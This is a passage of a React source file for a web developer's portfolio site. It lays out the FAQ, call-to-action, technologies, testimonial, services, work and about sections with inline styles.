              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
              fontSize: "clamp(11px,1.05vw,13px)", letterSpacing: "0.04em",
              textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
              borderRadius: 999, padding: "clamp(13px,1.3vw,18px) clamp(20px,2.2vw,30px)",
              border: 0, cursor: "pointer", transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >Book a Call</button>
            <button type="button" onClick={() => onOpenContact("left")} aria-label="Book a call" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: "clamp(42px,3.4vw,52px)", height: "clamp(42px,3.4vw,52px)",
              borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
              transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
          </div>
        </div>

        {/* Right: heading + questions */}
        <div style={{ flex: "2 1 560px", minWidth: 300 }}>
          <h2 style={{
            margin: "0 0 clamp(36px,5vw,80px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(28px,3.8vw,58px)", lineHeight: 1.1,
            letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
          }}>Frequently Asked Questions</h2>
          <p style={{
            margin: "-48px 0 clamp(36px,5vw,80px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: "clamp(14px,1.2vw,17px)",
            lineHeight: 1.6, color: "rgba(255,255,255,0.6)",
          }}>Answers to the questions clients ask me most often.</p>
          <div>
            {FAQS.map((item, i) => (
              <FAQAccordion
                key={item.q}
                item={item}
                index={i}
                open={open === i}
                onToggle={() => setOpen(open === i ? null : i)}
              />
            ))}
          </div>
        </div>
      </div>
      <script type="application/ld+json">{JSON.stringify(FAQ_SCHEMA)}</script>
    </section>
  );
}

// â”€â”€â”€ CLOSING CTA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Big centred headline with the clip sitting inline after "LET'S MOVE".
function ClosingCta({ onOpenContact }) {
  const [ref, inView] = useInView();
  return (
    <section
      id="become-client"
      onClick={e => {
        if (e.target === e.currentTarget) window.location.href = "mailto:Aqibfahraz@gmail.com";
      }}
      style={{ padding: "clamp(70px,9vw,140px) clamp(20px,5vw,60px)", cursor: "pointer" }}
    >
      <div ref={ref} style={{
        textAlign: "center",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <h2 style={{
          margin: 0,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(34px,6.4vw,96px)", lineHeight: 1.12,
          letterSpacing: "-0.02em", textTransform: "uppercase", color: "#eef2f6",
        }}>
          <span style={{
            display: "inline-flex", alignItems: "center", flexWrap: "wrap",
            justifyContent: "center", gap: "clamp(10px,1.4vw,24px)",
          }}>
            Let's Move
            <video
              src="/Contact.mp4"
              autoPlay loop muted playsInline
              style={{
                width: "clamp(96px,13vw,200px)", height: "clamp(56px,7.4vw,112px)",
                objectFit: "cover", display: "block", verticalAlign: "middle",
              }}
            />
          </span>
          <br />
          The World Together
        </h2>

        <div style={{
          display: "flex", alignItems: "center", justifyContent: "center", gap: 12,
          marginTop: "clamp(28px,4vw,56px)",
        }}>
          <button type="button" onClick={() => onOpenContact("right")} style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
            fontSize: "clamp(13px,1.3vw,19px)", letterSpacing: "0.02em",
            textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
            borderRadius: 999, padding: "clamp(16px,1.7vw,26px) clamp(28px,3vw,48px)",
            border: 0, cursor: "pointer", transition: "opacity 0.2s",
          }}
            onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
          >Become a Client</button>
          <button type="button" onClick={() => onOpenContact("right")} aria-label="Become a client" style={{
            display: "inline-flex", alignItems: "center", justifyContent: "center",
            width: "clamp(52px,4.6vw,74px)", height: "clamp(52px,4.6vw,74px)",
            borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
            transition: "opacity 0.2s",
          }}
            onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
              <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </button>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ OUR TECHNOLOGIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Three tiers, each a list of techs. `icon` is a path in /public â€” drop the
// brand logos in and fill it; until then each row shows a lettered placeholder.
const TECH_ICON = n => `/Tech%20SVG/${n}.svg`;
const TECH_TIERS = [
  {
    tier: "Single",
    items: [
      { name: "HTML", icon: TECH_ICON("html") },
      { name: "CSS", icon: TECH_ICON("css") },
      { name: "WordPress", icon: TECH_ICON("wordpress") },
      { name: "Shopify", icon: TECH_ICON("shopify") },
    ],
  },
  {
    tier: "Middle",
    items: [
      { name: "Laravel", icon: TECH_ICON("laravel") },
      { name: "mySQL", icon: TECH_ICON("mysql") },
      { name: "vue", icon: TECH_ICON("vue") },
      { name: "PHP", icon: TECH_ICON("php") },
    ],
  },
  {
    tier: "Enterprise",
    items: [
      { name: "React.js", icon: TECH_ICON("react") },
      { name: "Azure", icon: TECH_ICON("azure") },
      { name: "Python", icon: TECH_ICON("python") },
      { name: "Angular", icon: TECH_ICON("angular") },
      { name: "Node.js", icon: TECH_ICON("nodejs") },
    ],
  },
];

function OurTechnologies() {
  const [ref, inView] = useInView();
  return (
    <section id="our-technologies" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(32px,4vw,64px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Left: heading at the top, copy + CTA pinned to the bottom */}
        <div style={{
          flex: "1 1 340px", minWidth: 280,
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          gap: "clamp(40px,6vw,90px)",
        }}>
          <h2 style={{
            margin: 0,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(34px,4.6vw,66px)", lineHeight: 1.05,
            letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
            }}>My<br />Technologies</h2>

          <div>
            <p style={{
              margin: "0 0 clamp(18px,2vw,28px)", maxWidth: 380,
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(14px,1.3vw,18px)", lineHeight: 1.6,
              color: "rgba(255,255,255,0.6)",
            }}>A personalized approach to every project â€” for the best results.</p>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <a href="#our-technologies" style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                fontSize: "clamp(11px,1.1vw,13px)", letterSpacing: "0.04em",
                textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
                borderRadius: 999, padding: "clamp(14px,1.4vw,20px) clamp(24px,2.4vw,34px)",
                textDecoration: "none", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >More Technologies</a>
              <a href="#our-technologies" aria-label="More technologies" style={{
                display: "inline-flex", alignItems: "center", justifyContent: "center",
                width: "clamp(44px,3.6vw,56px)", height: "clamp(44px,3.6vw,56px)",
                borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
                transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                  <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </a>
            </div>
          </div>
        </div>

        {/* Right: the three tier columns */}
        <div style={{
          flex: "2 1 560px",
          display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(180px,1fr))",
          gap: "clamp(20px,2.5vw,44px)",
        }}>
          {TECH_TIERS.map(col => (
            <div key={col.tier}>
              <div style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                gap: 12, marginBottom: "clamp(20px,2.4vw,36px)",
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                fontSize: "clamp(17px,1.8vw,26px)", letterSpacing: "0.01em",
                textTransform: "uppercase", color: "#eef2f6",
              }}>
                {col.tier}
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                  strokeWidth="1.3" style={{ flexShrink: 0 }}>
                  <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              {col.items.map(it => (
                <div key={it.name} style={{
                  display: "flex", alignItems: "center", gap: "clamp(12px,1.2vw,18px)",
                  padding: "clamp(14px,1.5vw,22px) 0",
                  borderTop: "1px solid rgba(255,255,255,0.12)",
                }}>
                  {it.icon ? (
                    <img src={it.icon} alt="" style={{
                      width: "clamp(22px,2vw,30px)", height: "clamp(22px,2vw,30px)",
                      objectFit: "contain", flexShrink: 0,
                    }} />
                  ) : (
                    <span aria-hidden="true" style={{
                      width: "clamp(22px,2vw,30px)", height: "clamp(22px,2vw,30px)",
                      borderRadius: 6, border: "1px solid rgba(255,255,255,0.25)",
                      display: "flex", alignItems: "center", justifyContent: "center",
                      fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                      fontSize: "clamp(10px,0.9vw,13px)", color: "rgba(255,255,255,0.6)",
                      flexShrink: 0,
                    }}>{it.name[0].toUpperCase()}</span>
                  )}
                  <span style={{
                    fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                    fontSize: "clamp(14px,1.3vw,19px)", color: "#eef2f6",
                  }}>{it.name}</span>
                </div>
              ))}
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ TESTIMONIAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Author line is a placeholder on purpose â€” swap in a real client's name/role
// once you have one; don't attribute a quote to someone who didn't give it.
function Testimonial() {
  const [ref, inView] = useInView();
  return (
    <section id="testimonial" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(32px,5vw,80px)",
        alignItems: "flex-start",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <img src="/project-power.webp" alt="UAM Power website" style={{
          flex: "1 1 420px", maxWidth: "min(100%, 800px)",
          height: "clamp(240px,32vw,490px)", objectFit: "cover", display: "block",
        }} />

        <div style={{ flex: "1 1 380px", minWidth: 280 }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
            fontSize: "clamp(40px,4.5vw,64px)", lineHeight: 0.7,
            color: "#e8342a", marginBottom: "clamp(16px,2vw,28px)",
          }} aria-hidden="true">&ldquo;</div>

          <p style={{
            margin: 0,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(15px,1.5vw,21px)", lineHeight: 1.6,
            color: "#eef2f6",
          }}>
            We delivered an exceptional website representing the client's business
            and services. The site was user-friendly, visually appealing, and
            well-planned. The team's responsibility and cooperation in meeting all
            requirements with precision were remarkable...
          </p>

          <div style={{
            display: "flex", alignItems: "center", gap: "clamp(12px,1.4vw,20px)",
            marginTop: "clamp(18px,2vw,30px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif",
            fontSize: "clamp(13px,1.2vw,17px)",
          }}>
            <span style={{ fontWeight: 700, color: "#eef2f6" }}>Client Name</span>
            <span style={{ width: 1, height: 20, background: "rgba(255,255,255,0.3)" }} />
            <span style={{ fontWeight: 400, color: "rgba(255,255,255,0.75)" }}>Role, Company</span>
          </div>

          <div style={{ marginTop: "clamp(40px,5vw,80px)" }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(56px,7vw,104px)", lineHeight: 1,
              letterSpacing: "-0.02em", color: "rgba(255,255,255,0.45)",
            }}>400+</div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
              fontSize: "clamp(18px,2vw,30px)", letterSpacing: "0.01em",
              textTransform: "uppercase", color: "#eef2f6", marginTop: 8,
            }}>Satisfied Clients</div>
          </div>
        </div>
      </div>
    </section>
  );
}

function Services({ isMobile }) {
  const [ref, inView] = useInView();
  const [openService, setOpenService] = useState(null);

  return (
    <section id="services" style={{
      padding: "0 clamp(20px,5vw,60px) clamp(70px,10vw,140px)",
      scrollMarginTop: "clamp(100px,12vw,150px)",
    }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Big heading, like the reference */}
        <h2 style={{
          margin: 0,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(40px,7vw,110px)", lineHeight: 1,
          letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
        }}>Services</h2>
        <div style={{ marginTop: "clamp(32px,5vw,64px)" }}>
          {SERVICES_LIST.map(s => (
            <ServiceRow
              key={s.id}
              s={s}
              open={openService === s.id}
              onToggle={() => setOpenService(openService === s.id ? null : s.id)}
            />
          ))}
        </div>
      </div>
    </section>
  );
}

function Work({ isMobile }) {
  const [ref, inView] = useInView();

  // Ticks up one per half-second: starts at 120, and every time it hits 200 it
  // restarts from 140. Only runs while the section is on screen.
  const [count, setCount] = useState(120);
  useEffect(() => {
    if (!inView) return;
    const id = setInterval(() => setCount(c => (c >= 200 ? 140 : c + 1)), 1000);
    return () => clearInterval(id);
  }, [inView]);

  return (
    <section id="work" style={{ padding: "clamp(28px,10vw,140px) clamp(20px,5vw,60px) 0" }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Intro sentence with the CTA sitting inline inside the line */}
        <div style={{
          display: "flex", alignItems: "center", flexWrap: "wrap",
          gap: "clamp(10px,1.2vw,18px)",
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(20px,3vw,44px)", letterSpacing: "-0.02em",
          color: "rgba(255,255,255,0.45)",
        }}>
          <span>All my projects</span>
          <a href="#become-client" style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
            fontSize: "clamp(11px,1.1vw,15px)", letterSpacing: "0.02em",
            textTransform: "uppercase", color: "#eef2f6",
            background: "rgba(255,255,255,0.12)", borderRadius: 999,
            padding: "clamp(10px,1vw,16px) clamp(18px,1.8vw,30px)",
            textDecoration: "none", whiteSpace: "nowrap",
            transition: "background 0.25s ease",
          }}
            onMouseEnter={e => e.currentTarget.style.background = "rgba(255,255,255,0.2)"}
            onMouseLeave={e => e.currentTarget.style.background = "rgba(255,255,255,0.12)"}
          >Create New</a>
          <a href="#become-client" aria-label="Start a project" style={{
            display: "inline-flex", alignItems: "center", justifyContent: "center",
            width: "clamp(38px,3.4vw,58px)", height: "clamp(38px,3.4vw,58px)",
            borderRadius: "50%", background: "rgba(255,255,255,0.12)",
            color: "#eef2f6", flexShrink: 0, transition: "background 0.25s ease",
          }}
            onMouseEnter={e => e.currentTarget.style.background = "rgba(255,255,255,0.2)"}
            onMouseLeave={e => e.currentTarget.style.background = "rgba(255,255,255,0.12)"}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
              <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </a>
          <span>are delivered with quality.</span>
        </div>

        {/* Big heading with the brand card sitting inline between the words */}
        <h2 id="work-proud" style={{
          display: "flex", alignItems: "center", flexWrap: "wrap",
          gap: "clamp(12px,1.6vw,28px)", margin: "clamp(28px,4vw,56px) 0 0",
          scrollMarginTop: "clamp(100px,12vw,150px)",
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
          fontSize: "clamp(34px,6vw,76px)", lineHeight: 0.94,
          letterSpacing: "-0.035em", textTransform: "uppercase", color: "#eef2f6",
        }}>
          <span>I Am</span>
          <span style={{
            display: "inline-flex", flexDirection: "column", justifyContent: "center",
            background: "#eef2f6", color: "#02060a",
            width: "clamp(96px,11vw,150px)", height: "clamp(58px,6.4vw,88px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif", lineHeight: 1,
            textTransform: "none", flexShrink: 0,
          }}>
            <span style={{
              fontWeight: 800, fontSize: "clamp(16px,1.8vw,24px)",
              letterSpacing: "-0.02em", textAlign: "center",
            }}>Aqib Faraz</span>
          </span>
          <span>Proud</span>
        </h2>

        {/* Masonry: 3 columns, each card as tall as its own cover image, so the
            columns stagger naturally. 6 projects â†’ 3 on top, 3 below. */}
        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          columnCount: isMobile ? 1 : 3,
          columnGap: "clamp(8px,1vw,14px)",
        }}>
          {PROJECTS.map((p, i) => <WorkCard key={p.id} p={p} i={i} inView={inView} />)}
        </div>

        {/* More-projects strip: count on the left, CTA + thumbnails on the right */}
        <div style={{
          marginTop: "clamp(52px,6.5vw,96px)",
          paddingTop: "clamp(32px,4vw,60px)",
          paddingBottom: "clamp(20px,3vw,40px)",
          borderTop: "1px solid rgba(255,255,255,0.14)",
          display: "flex", alignItems: "flex-start", justifyContent: "space-between",
          flexWrap: "wrap", gap: "clamp(24px,3vw,48px)",
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(34px,4.4vw,62px)", letterSpacing: "0.01em",
            color: "#eef2f6",
          }}>({count})</div>

          <div>
            <a href="#work" style={{
              display: "flex", alignItems: "center", gap: "clamp(10px,1.4vw,22px)",
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(34px,4.4vw,62px)", letterSpacing: "-0.01em",
              textTransform: "uppercase", color: "#eef2f6", textDecoration: "none",
              transition: "opacity 0.25s ease",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.6"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >
              More Projects
              <svg width="46" height="24" viewBox="0 0 46 24" fill="none" stroke="currentColor" strokeWidth="1.6" style={{ flexShrink: 0 }}>
                <path d="M45 12H2M13 3 2 12l11 9" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
            {/* Thumbnails slide left forever, clipped to this strip. The list is
                duplicated so the -50% loop point is seamless. */}
            <div style={{
              marginTop: "clamp(12px,1.4vw,20px)",
              width: "clamp(340px,40vw,600px)",
              overflow: "hidden",
            }}>
              <div style={{
                display: "flex", gap: 4, width: "max-content",
                animation: "marqueeLeft 22s linear infinite",
              }}>
                {[...PROJECTS, ...PROJECTS].map((p, idx) => (
                  <img key={idx} src={p.image} alt={p.title} style={{
                    width: "clamp(90px,11vw,152px)", height: "clamp(56px,7vw,96px)",
                    objectFit: "cover", display: "block", flexShrink: 0,
                  }} />
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ STACK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â”€â”€â”€ TECHNOLOGIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// `menu.layout` is column-major: each column stacks its own
// blocks (a labelled bullet list, or a bare heading with no items) top to bottom.
function Technologies({ isMobile }) {
  const [ref, inView] = useInView();
  const menu = TECHNOLOGY_MENU;

  return (
    <section id="stack" style={{ padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <SectionLabel num="04" title="Technologies" />
        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          background: "#fff", borderRadius: 20, overflow: "hidden",
          display: "flex", flexWrap: "wrap",
        }}>
          {/* Sidebar */}
          <div style={{
            width: "clamp(240px,22vw,300px)", flexShrink: 0,
            padding: "clamp(32px,4vw,52px) clamp(28px,3vw,40px)",
            display: "flex", flexDirection: "column", justifyContent: "space-between", gap: 60,
            borderRight: isMobile ? "none" : "1px solid rgba(2,6,10,0.1)",
            borderBottom: isMobile ? "1px solid rgba(2,6,10,0.1)" : "none",
          }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(26px,3vw,34px)", letterSpacing: "0.02em",
              textTransform: "uppercase", color: "#02060a",
            }}>{menu.title}</div>
            <p style={{
              margin: 0, fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 15,
              lineHeight: 1.6, color: "rgba(2,6,10,0.6)", maxWidth: 220,
            }}>I develop online stores, CRM systems, SaaS platforms, and apps â€” integrating AI into processes and solutions.</p>
          </div>

          {/* Main technologies â€” column-major: each column stacks its own blocks */}
          <div style={{
            flex: 1, minWidth: 280, padding: "clamp(32px,4vw,52px) clamp(28px,3.5vw,48px)",
            display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(170px,1fr))",
            gap: "40px 32px", alignContent: "start",
          }}>
            {menu.layout.map((column, colI) => (
              <div key={colI} style={{ display: "flex", flexDirection: "column", gap: "clamp(32px,4vw,48px)" }}>
                {column.map((block, blockI) => (
                  <div key={blockI}>
                    {block.items.length > 0 ? (
                      <>
                        <div style={{
                          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 12,
                          letterSpacing: "0.08em", textTransform: "uppercase",
                          color: "rgba(2,6,10,0.4)", marginBottom: 16,
                        }}>{block.heading}</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                          {block.items.map(it => (
                            <a key={it.label} href={it.href} style={{
                              display: "flex", alignItems: "flex-start", gap: 10,
                              fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
                              fontWeight: 500, letterSpacing: "0.01em", textTransform: "uppercase",
                              color: "#02060a", textDecoration: "none", lineHeight: 1.35,
                              transition: "opacity 0.2s",
                            }}
                              onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                            >
                              <span style={{ width: 5, height: 5, borderRadius: "50%", marginTop: 6, border: "1px solid rgba(2,6,10,0.4)", flexShrink: 0 }} />
                              {it.label}
                            </a>
                          ))}
                        </div>
                        {block.pill && (
                          <span style={{
                            display: "inline-block", marginTop: 16,
                            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 12, fontWeight: 500,
                            color: "rgba(2,6,10,0.55)", background: "rgba(2,6,10,0.06)",
                            borderRadius: 999, padding: "6px 14px",
                          }}>{block.pill}</span>
                        )}
                      </>
                    ) : (
                      <a href="#stack" style={{
                        fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
                        fontSize: "clamp(18px,2.2vw,25px)", letterSpacing: "-0.01em", textTransform: "uppercase",
                        color: "#02060a", textDecoration: "none", transition: "opacity 0.2s",
                      }}
                        onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                        onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                      >{block.heading}</a>
                    )}
                  </div>
                ))}
              </div>
            ))}
          </div>

          {/* Featured project panel â€” full column height via flex stretch */}
          <div style={{
            width: "clamp(240px,26vw,340px)", flexShrink: 0,
            background: "#333", padding: "clamp(28px,3.5vw,44px)",
            display: "flex", flexDirection: "column", gap: 20,
          }}>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 17,
              letterSpacing: "0.02em", textTransform: "uppercase", color: "#eef2f6",
            }}>New Project</div>
            <div style={{ flex: 1, minHeight: 260, borderRadius: 10, overflow: "hidden", background: "#1a1a1a" }}>
              <img src="/Coolag.png" alt="Latest project preview" style={{
                width: "100%", height: "100%", objectFit: "cover", display: "block",
              }} />
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ ABOUT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function About() {
  const [ref, inView] = useInView();

  return (
    <section id="about" style={{
      padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)",
      borderTop: "1px solid rgba(255,255,255,0.07)",
    }}>
      <div ref={ref} style={{
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <SectionLabel num="05" title="About" />

        <div style={{
          marginTop: "clamp(36px,6vw,72px)",
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
          gap: "clamp(36px,6vw,80px)",
          alignItems: "start",
        }}>

          {/* LEFT: Photo + bio */}
          <div style={{ display: "flex", flexDirection: "column", gap: 32 }}>

            {/* Photo Card */}
            <div style={{ position: "relative", alignSelf: "center" }}>
              {/* Corner accents */}
              <div style={{
                position: "absolute", top: -8, left: -8, width: 28, height: 28,
                borderTop: "2px solid #f3f3f3", borderLeft: "2px solid #f3f3f3", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", bottom: -8, right: -8, width: 28, height: 28,
                borderBottom: "2px solid #f3f3f3", borderRight: "2px solid #f3f3f3", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", top: -8, right: -8, width: 28, height: 28,
                borderTop: "2px solid rgba(255,255,255,0.3)", borderRight: "2px solid rgba(255,255,255,0.3)", zIndex: 2,
              }} />
              <div style={{
                position: "absolute", bottom: -8, left: -8, width: 28, height: 28,
                borderBottom: "2px solid rgba(255,255,255,0.3)", borderLeft: "2px solid rgba(255,255,255,0.3)", zIndex: 2,
              }} />

              {/* Glow behind image */}
              <div style={{
                position: "absolute", inset: -1,
                background: "linear-gradient(135deg, rgba(255,255,255,0.08), transparent 60%)",
                zIndex: 0,
              }} />

              <img
                src={aqibPhoto}
                alt="Aqib Faraz"
                style={{
                  width: "clamp(200px,28vw,320px)",
                  height: "clamp(240px,34vw,380px)",
                  objectFit: "cover",
                  objectPosition: "top center",
                  display: "block",
                  position: "relative", zIndex: 1,
                  filter: "grayscale(20%) contrast(1.05)",
                  transition: "filter 0.4s ease",
                }}
                onMouseEnter={e => e.target.style.filter = "grayscale(0%) contrast(1.1)"}
                onMouseLeave={e => e.target.style.filter = "grayscale(20%) contrast(1.05)"}
              />

              {/* Status badge over image */}
              <div style={{
                position: "absolute", bottom: 16, left: 16, right: 16,
                background: "rgba(2,6,10,0.85)", backdropFilter: "blur(8px)",
                border: "1px solid rgba(255,255,255,0.2)",
                padding: "10px 14px", zIndex: 3,
                display: "flex", alignItems: "center", gap: 8,
              }}>
                <span style={{
                  width: 7, height: 7, borderRadius: "50%", background: "#f3f3f3",
                  boxShadow: "0 0 10px rgba(255,255,255,0.35)", display: "inline-block",
                  animation: "pulse 2s ease-in-out infinite", flexShrink: 0,
                }} />
                <span style={{
                  fontFamily: "'Space Mono',monospace", fontSize: 9,
                  letterSpacing: "0.2em", color: "#f3f3f3", textTransform: "uppercase",
